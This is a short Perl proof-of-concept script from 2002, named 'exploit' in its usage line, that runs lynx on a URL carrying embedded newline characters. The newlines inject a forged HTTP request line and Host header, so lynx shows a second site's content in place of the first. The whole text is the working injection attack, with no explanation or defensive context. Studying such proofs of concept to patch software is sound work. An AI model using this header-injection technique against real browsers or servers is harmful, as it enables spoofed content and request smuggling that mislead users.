#!/usr/bin/perl --
# Ulf Harnhammar 2002
# example: ./exploit www.site1.st www.site2.st
# will show www.site2.st

die "$0 hostone hosttwo\n" if @ARGV != 2;

exec('lynx "'.
     "http://$ARGV[0]/ HTTP/1.0\012".
     "Host: $ARGV[1]\012\012".
     '"');